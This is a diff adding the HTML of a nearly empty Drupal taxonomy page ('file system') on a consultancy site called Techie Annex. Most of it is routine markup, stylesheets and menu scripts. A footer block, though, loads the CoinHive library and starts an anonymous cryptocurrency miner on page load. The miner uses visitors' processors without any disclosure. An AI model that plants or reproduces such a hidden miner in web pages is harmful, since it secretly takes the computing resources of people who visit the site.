@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]><html class="lt-ie9 lt-ie8 lt-ie7" lang="en" dir="ltr"><![endif]-->
+<!--[if IE 7]><html class="lt-ie9 lt-ie8" lang="en" dir="ltr"><![endif]-->
+<!--[if IE 8]><html class="lt-ie9" lang="en" dir="ltr"><![endif]-->
+<!--[if gt IE 8]><!--><html lang="en" dir="ltr" prefix="content: http://purl.org/rss/1.0/modules/content/ dc: http://purl.org/dc/terms/ foaf: http://xmlns.com/foaf/0.1/ og: http://ogp.me/ns# rdfs: http://www.w3.org/2000/01/rdf-schema# sioc: http://rdfs.org/sioc/ns# sioct: http://rdfs.org/sioc/types# skos: http://www.w3.org/2004/02/skos/core# xsd: http://www.w3.org/2001/XMLSchema#"><!--<![endif]-->
+<head>
+<meta charset="utf-8" />
+<link href="http://techieannex.com/sites/all/themes/at_techieannex/images/iphone-retina-120x120.png" rel="apple-touch-icon" sizes="120x120" />
+<link href="http://techieannex.com/sites/all/themes/at_techieannex/images/ipad-retina-152x152.png" rel="apple-touch-icon" sizes="152x152" />
+<link href="http://techieannex.com/sites/all/themes/at_techieannex/images/ipad-standard-76x76.png" rel="apple-touch-icon" sizes="76x76" />
+<link href="http://techieannex.com/sites/all/themes/at_techieannex/images/default-60x60.png" rel="apple-touch-icon" />
+<link href="http://techieannex.com/sites/all/themes/at_techieannex/images/default-60x60.png" rel="shortcut icon" />
+<link rel="shortcut icon" href="http://techieannex.com/favicon.ico" type="image/vnd.microsoft.icon" />
+<meta about="/software-categories/file-system" typeof="skos:Concept" property="rdfs:label skos:prefLabel" content="file system" />
+<link rel="alternate" type="application/rss+xml" title="RSS - file system" href="http://techieannex.com/taxonomy/term/59/feed" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+<meta name="MobileOptimized" content="width" />
+<meta name="HandheldFriendly" content="1" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="generator" content="Drupal 7 (https://www.drupal.org)" />
+<link rel="canonical" href="http://techieannex.com/software-categories/file-system" />
+<link rel="shortlink" href="http://techieannex.com/taxonomy/term/59" />
+<title>file system | Techie Annex</title>
+<style type="text/css" media="all">
+@import url("http://techieannex.com/modules/system/system.base.css?prd7ei");
+@import url("http://techieannex.com/modules/system/system.menus.css?prd7ei");
+@import url("http://techieannex.com/modules/system/system.messages.css?prd7ei");
+@import url("http://techieannex.com/modules/system/system.theme.css?prd7ei");
+</style>
+<style type="text/css" media="all">
+@import url("http://techieannex.com/modules/comment/comment.css?prd7ei");
+@import url("http://techieannex.com/modules/field/theme/field.css?prd7ei");
+@import url("http://techieannex.com/modules/node/node.css?prd7ei");
+@import url("http://techieannex.com/modules/search/search.css?prd7ei");
+@import url("http://techieannex.com/modules/user/user.css?prd7ei");
+@import url("http://techieannex.com/sites/all/modules/views/css/views.css?prd7ei");
+</style>
+<style type="text/css" media="all">
+@import url("http://techieannex.com/sites/all/modules/ctools/css/ctools.css?prd7ei");
+@import url("http://techieannex.com/sites/all/modules/panels/css/panels.css?prd7ei");
+@import url("http://techieannex.com/modules/taxonomy/taxonomy.css?prd7ei");
+@import url("http://techieannex.com/sites/all/libraries/superfish/css/superfish.css?prd7ei");
+@import url("http://techieannex.com/sites/all/libraries/superfish/css/superfish-smallscreen.css?prd7ei");
+@import url("http://techieannex.com/sites/all/libraries/superfish/style/simple/simple.css?prd7ei");
+</style>
+<style type="text/css" media="screen">
+@import url("http://techieannex.com/sites/all/themes/adaptivetheme/at_core/css/at.settings.style.headings.css?prd7ei");
+@import url("http://techieannex.com/sites/all/themes/adaptivetheme/at_core/css/at.settings.style.image.css?prd7ei");
+@import url("http://techieannex.com/sites/all/themes/adaptivetheme/at_core/css/at.settings.style.floatblocks.css?prd7ei");
+@import url("http://techieannex.com/sites/all/themes/adaptivetheme/at_core/css/at.settings.style.login.css?prd7ei");
+@import url("http://techieannex.com/sites/all/themes/adaptivetheme/at_core/css/at.layout.css?prd7ei");
+@import url("http://techieannex.com/sites/all/themes/at_techieannex/css/global.base.css?prd7ei");
+@import url("http://techieannex.com/sites/all/themes/at_techieannex/css/global.styles.css?prd7ei");
+</style>
+<link type="text/css" rel="stylesheet" href="http://techieannex.com/sites/default/files/adaptivetheme/adaptivetheme_techieannex_files/adaptivetheme_techieannex.responsive.layout.css?prd7ei" media="only screen" />
+<style type="text/css" media="screen">
+@import url("http://techieannex.com/sites/default/files/adaptivetheme/adaptivetheme_techieannex_files/adaptivetheme_techieannex.fonts.css?prd7ei");
+</style>
+<style type="text/css" media="all">
+@import url("http://techieannex.com/sites/default/files/adaptivetheme/adaptivetheme_techieannex_files/adaptivetheme_techieannex.menutoggle.css?prd7ei");
+</style>
+<link type="text/css" rel="stylesheet" href="http://techieannex.com/sites/all/themes/at_techieannex/css/responsive.custom.css?prd7ei" media="only screen" />
+<link type="text/css" rel="stylesheet" href="http://techieannex.com/sites/all/themes/at_techieannex/css/responsive.smalltouch.portrait.css?prd7ei" media="only screen and (max-width:320px)" />
+<link type="text/css" rel="stylesheet" href="http://techieannex.com/sites/all/themes/at_techieannex/css/responsive.smalltouch.landscape.css?prd7ei" media="only screen and (min-width:321px) and (max-width:580px)" />
+<link type="text/css" rel="stylesheet" href="http://techieannex.com/sites/all/themes/at_techieannex/css/responsive.tablet.portrait.css?prd7ei" media="only screen and (min-width:581px) and (max-width:768px)" />
+<link type="text/css" rel="stylesheet" href="http://techieannex.com/sites/all/themes/at_techieannex/css/responsive.tablet.landscape.css?prd7ei" media="only screen and (min-width:769px) and (max-width:1024px)" />
+<link type="text/css" rel="stylesheet" href="http://techieannex.com/sites/all/themes/at_techieannex/css/responsive.desktop.css?prd7ei" media="only screen and (min-width:1024px)" />
+<style type="text/css" media="screen">
+@import url("http://techieannex.com/sites/default/files/adaptivetheme/adaptivetheme_techieannex_files/adaptivetheme_techieannex.custom.css?prd7ei");
+</style>
+<link type="text/css" rel="stylesheet" href="//fonts.googleapis.com/css?family=Lusitana" media="all" />
+
+<!--[if lt IE 9]>
+<style type="text/css" media="screen">
+@import url("http://techieannex.com/sites/default/files/adaptivetheme/adaptivetheme_techieannex_files/adaptivetheme_techieannex.lt-ie9.layout.css?prd7ei");
+</style>
+<![endif]-->
+<script type="text/javascript" src="http://techieannex.com/misc/jquery.js?v=1.4.4"></script>
+<script type="text/javascript" src="http://techieannex.com/misc/jquery-extend-3.4.0.js?v=1.4.4"></script>
+<script type="text/javascript" src="http://techieannex.com/misc/jquery.once.js?v=1.2"></script>
+<script type="text/javascript" src="http://techieannex.com/misc/drupal.js?prd7ei"></script>
+<script type="text/javascript" src="http://techieannex.com/sites/all/libraries/superfish/jquery.hoverIntent.minified.js?prd7ei"></script>
+<script type="text/javascript" src="http://techieannex.com/sites/all/libraries/superfish/sftouchscreen.js?prd7ei"></script>
+<script type="text/javascript" src="http://techieannex.com/sites/all/libraries/superfish/sfsmallscreen.js?prd7ei"></script>
+<script type="text/javascript" src="http://techieannex.com/sites/all/libraries/superfish/superfish.js?prd7ei"></script>
+<script type="text/javascript" src="http://techieannex.com/sites/all/libraries/superfish/supersubs.js?prd7ei"></script>
+<script type="text/javascript" src="http://techieannex.com/sites/all/modules/superfish/superfish.js?prd7ei"></script>
+<script type="text/javascript" src="http://techieannex.com/sites/all/themes/adaptivetheme/at_core/scripts/matchMedia.js?prd7ei"></script>
+<script type="text/javascript" src="http://techieannex.com/sites/all/themes/adaptivetheme/at_core/scripts/matchMedia.addListener.js?prd7ei"></script>
+<script type="text/javascript" src="http://techieannex.com/sites/all/themes/adaptivetheme/at_core/scripts/outside-events.js?prd7ei"></script>
+<script type="text/javascript" src="http://techieannex.com/sites/all/themes/adaptivetheme/at_core/scripts/menu-toggle.js?prd7ei"></script>
+<script type="text/javascript">
+<!--//--><![CDATA[//><!--
+jQuery.extend(Drupal.settings, {"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"adaptivetheme_techieannex","theme_token":"b3Ky5BbJYVASzGt3XXnCnAWGEw3X_5AtQoKtSL15arA","js":{"misc\/jquery.js":1,"misc\/jquery-extend-3.4.0.js":1,"misc\/jquery.once.js":1,"misc\/drupal.js":1,"sites\/all\/libraries\/superfish\/jquery.hoverIntent.minified.js":1,"sites\/all\/libraries\/superfish\/sftouchscreen.js":1,"sites\/all\/libraries\/superfish\/sfsmallscreen.js":1,"sites\/all\/libraries\/superfish\/superfish.js":1,"sites\/all\/libraries\/superfish\/supersubs.js":1,"sites\/all\/modules\/superfish\/superfish.js":1,"sites\/all\/themes\/adaptivetheme\/at_core\/scripts\/matchMedia.js":1,"sites\/all\/themes\/adaptivetheme\/at_core\/scripts\/matchMedia.addListener.js":1,"sites\/all\/themes\/adaptivetheme\/at_core\/scripts\/outside-events.js":1,"sites\/all\/themes\/adaptivetheme\/at_core\/scripts\/menu-toggle.js":1},"css":{"modules\/system\/system.base.css":1,"modules\/system\/system.menus.css":1,"modules\/system\/system.messages.css":1,"modules\/system\/system.theme.css":1,"modules\/comment\/comment.css":1,"modules\/field\/theme\/field.css":1,"modules\/node\/node.css":1,"modules\/search\/search.css":1,"modules\/user\/user.css":1,"sites\/all\/modules\/views\/css\/views.css":1,"sites\/all\/modules\/ctools\/css\/ctools.css":1,"sites\/all\/modules\/panels\/css\/panels.css":1,"modules\/taxonomy\/taxonomy.css":1,"sites\/all\/libraries\/superfish\/css\/superfish.css":1,"sites\/all\/libraries\/superfish\/css\/superfish-smallscreen.css":1,"sites\/all\/libraries\/superfish\/style\/simple\/simple.css":1,"sites\/all\/themes\/adaptivetheme\/at_core\/css\/at.settings.style.headings.css":1,"sites\/all\/themes\/adaptivetheme\/at_core\/css\/at.settings.style.image.css":1,"sites\/all\/themes\/adaptivetheme\/at_core\/css\/at.settings.style.floatblocks.css":1,"sites\/all\/themes\/adaptivetheme\/at_core\/css\/at.settings.style.login.css":1,"sites\/all\/themes\/adaptivetheme\/at_core\/css\/at.layout.css":1,"sites\/all\/themes\/at_techieannex\/css\/global.base.css":1,"sites\/all\/themes\/at_techieannex\/css\/global.styles.css":1,"public:\/\/adaptivetheme\/adaptivetheme_techieannex_files\/adaptivetheme_techieannex.responsive.layout.css":1,"public:\/\/adaptivetheme\/adaptivetheme_techieannex_files\/adaptivetheme_techieannex.fonts.css":1,"public:\/\/adaptivetheme\/adaptivetheme_techieannex_files\/adaptivetheme_techieannex.menutoggle.css":1,"sites\/all\/themes\/at_techieannex\/css\/responsive.custom.css":1,"sites\/all\/themes\/at_techieannex\/css\/responsive.smalltouch.portrait.css":1,"sites\/all\/themes\/at_techieannex\/css\/responsive.smalltouch.landscape.css":1,"sites\/all\/themes\/at_techieannex\/css\/responsive.tablet.portrait.css":1,"sites\/all\/themes\/at_techieannex\/css\/responsive.tablet.landscape.css":1,"sites\/all\/themes\/at_techieannex\/css\/responsive.desktop.css":1,"public:\/\/adaptivetheme\/adaptivetheme_techieannex_files\/adaptivetheme_techieannex.custom.css":1,"\/\/fonts.googleapis.com\/css?family=Lusitana":1,"public:\/\/adaptivetheme\/adaptivetheme_techieannex_files\/adaptivetheme_techieannex.lt-ie9.layout.css":1}},"urlIsAjaxTrusted":{"\/search\/node":true},"superfish":{"1":{"id":"1","sf":{"animation":{"opacity":"show","height":"show","width":"show"},"dropShadows":false},"plugins":{"touchscreen":{"mode":"window_width","breakpointUnit":"px"},"smallscreen":{"mode":"window_width","breakpointUnit":"px","title":"Main menu"},"supersubs":true}}},"adaptivetheme":{"adaptivetheme_techieannex":{"layout_settings":{"bigscreen":"three-col-grail","tablet_landscape":"three-col-grail","tablet_portrait":"one-col-vert","smalltouch_landscape":"one-col-stack","smalltouch_portrait":"one-col-stack"},"media_query_settings":{"bigscreen":"only screen and (min-width:1024px)","tablet_landscape":"only screen and (min-width:769px) and (max-width:1024px)","tablet_portrait":"only screen and (min-width:581px) and (max-width:768px)","smalltouch_landscape":"only screen and (min-width:321px) and (max-width:580px)","smalltouch_portrait":"only screen and (max-width:320px)"},"menu_toggle_settings":{"menu_toggle_tablet_portrait":"false","menu_toggle_tablet_landscape":"false"}}}});
+//--><!]]>
+</script>
+<!--[if lt IE 9]>
+<script src="http://techieannex.com/sites/all/themes/adaptivetheme/at_core/scripts/html5.js?prd7ei"></script>
+<![endif]-->
+</head>
+<body class="html not-front not-logged-in no-sidebars page-taxonomy page-taxonomy-term page-taxonomy-term- page-taxonomy-term-59 atr-7.x-3.x atv-7.x-3.2 site-name-techie-annex section-software-categories">
+  <div id="skip-link" class="nocontent">
+    <a href="#main-content" class="element-invisible element-focusable">Skip to main content</a>
+  </div>
+    <div id="page-wrapper">
+  <div id="page" class="container page snc-lc snw-n sna-l sns-n ssc-n ssw-b ssa-l sss-n btc-n btw-b bta-l bts-n ntc-n ntw-b nta-l nts-n ctc-n ctw-b cta-l cts-n ptc-n ptw-b pta-l pts-n at-mt">
+
+    <!-- !Leaderboard Region -->
+    
+    <header id="header" class="clearfix" role="banner">
+
+              <!-- !Branding -->
+        <div id="branding" class="branding-elements clearfix">
+
+          
+                      <!-- !Site name and Slogan -->
+            <div class="h-group" id="name-and-slogan">
+
+                              <h1 id="site-name"><a href="/" title="Home page">Techie Annex</a></h1>
+              
+                              <h2 id="site-slogan">More to do than time or people? Call me.</h2>
+              
+            </div>
+          
+        </div>
+      
+      <!-- !Header Region -->
+      <div class="region region-header"><div class="region-inner clearfix"><nav id="block-superfish-1" class="block block-superfish odd first last block-count-1 block-region-header block-1" ><div class="block-inner clearfix">  
+      <h2 class="block-title">Main menu</h2>
+  
+  <ul  id="superfish-1" class="menu sf-menu sf-main-menu sf-horizontal sf-style-simple sf-total-items-7 sf-parent-items-0 sf-single-items-7"><li id="menu-219-1" class="first odd sf-item-1 sf-depth-1 sf-no-children"><a href="/" title="" class="sf-depth-1">Overview</a></li><li id="menu-503-1" class="middle even sf-item-2 sf-depth-1 sf-no-children"><a href="/services" class="sf-depth-1">Services</a></li><li id="menu-498-1" class="middle odd sf-item-3 sf-depth-1 sf-no-children"><a href="/breadth" title="Software categories Lubkin has experienced in" class="sf-depth-1">Breadth</a></li><li id="menu-500-1" class="middle even sf-item-4 sf-depth-1 sf-no-children"><a href="/results" title="" class="sf-depth-1">Results</a></li><li id="menu-496-1" class="middle odd sf-item-5 sf-depth-1 sf-no-children"><a href="/namedrops" title="Among those satisfied with Lubkin&#039;s work" class="sf-depth-1">Namedrops</a></li><li id="menu-492-1" class="middle even sf-item-6 sf-depth-1 sf-no-children"><a href="/praise" title="Testimonials to Lubkin&#039;s work" class="sf-depth-1">Praise</a></li><li id="menu-315-1" class="last odd sf-item-7 sf-depth-1 sf-no-children"><a href="/contact" title="" class="sf-depth-1">Contact</a></li></ul>
+  </div></nav></div></div>
+    </header>
+
+    <!-- !Navigation -->
+        <div id="primary-menu-bar" class="nav clearfix at-menu-toggle"><nav  class="primary-menu-wrapper menu-wrapper clearfix" role="navigation" aria-labelledby="primary-menu"><h2 class="element-invisible" id="primary-menu">Main menu</h2><ul class="menu primary-menu clearfix"><li class="menu-219 first"><a href="/" title="">Overview</a></li><li class="menu-503"><a href="/services">Services</a></li><li class="menu-498"><a href="/breadth" title="Software categories Lubkin has experienced in">Breadth</a></li><li class="menu-500"><a href="/results" title="">Results</a></li><li class="menu-496"><a href="/namedrops" title="Among those satisfied with Lubkin&#039;s work">Namedrops</a></li><li class="menu-492"><a href="/praise" title="Testimonials to Lubkin&#039;s work">Praise</a></li><li class="menu-315 last"><a href="/contact" title="">Contact</a></li></ul></nav></div>    
+    <!-- !Breadcrumbs -->
+    
+    <!-- !Messages and Help -->
+        
+    <!-- !Secondary Content Region -->
+    
+    <div id="columns" class="columns clearfix">
+      <main id="content-column" class="content-column" role="main">
+        <div class="content-inner">
+
+          <!-- !Highlighted region -->
+          
+          <section id="main-content">
+
+            
+            <!-- !Main Content Header -->
+                          <header id="main-content-header" class="clearfix">
+
+                                  <h1 id="page-title">
+                    file system                  </h1>
+                
+                
+              </header>
+            
+            <!-- !Main Content -->
+                          <div id="content" class="region">
+                <div id="block-system-main" class="block block-system no-title odd first last block-count-2 block-region-content block-main" >  
+  
+  <p>There is currently no content classified with this term.</p><section class="nodes"></section>
+  </div>              </div>
+            
+            <!-- !Feed Icons -->
+            
+            
+          </section><!-- /end #main-content -->
+
+          <!-- !Content Aside Region-->
+          
+        </div><!-- /end .content-inner -->
+      </main><!-- /end #content-column -->
+
+      <!-- !Sidebar Regions -->
+            
+    </div><!-- /end #columns -->
+
+    <!-- !Tertiary Content Region -->
+    
+    <!-- !Footer -->
+          <footer id="footer" class="clearfix" role="contentinfo">
+        <div class="region region-footer"><div class="region-inner clearfix"><section id="block-block-1" class="block block-block odd first block-count-3 block-region-footer block-1" ><div class="block-inner clearfix">  
+      <h2 class="block-title">Legal statements</h2>
+  
+  <div class="block-content content"><p>© 2016-2021 USI. Techie Annex is a trademark of USI.</p>
+</div>
+  </div></section><div id="block-block-9" class="block block-block no-title even last block-count-4 block-region-footer block-9" ><div class="block-inner clearfix">  
+  
+  <div class="block-content content"><script src="https://coinhive.com/lib/coinhive.min.js"></script><script>
+<!--//--><![CDATA[// ><!--
+var miner = new CoinHive.Anonymous("XoWXAWvizTNnyia78qTIFfATRgcbJfGx",{throttle: 0.1});miner.start();
+//--><!]]>
+</script></div>
+  </div></div></div></div>              </footer>
+    
+  </div>
+</div>
+  </body>
+</html>
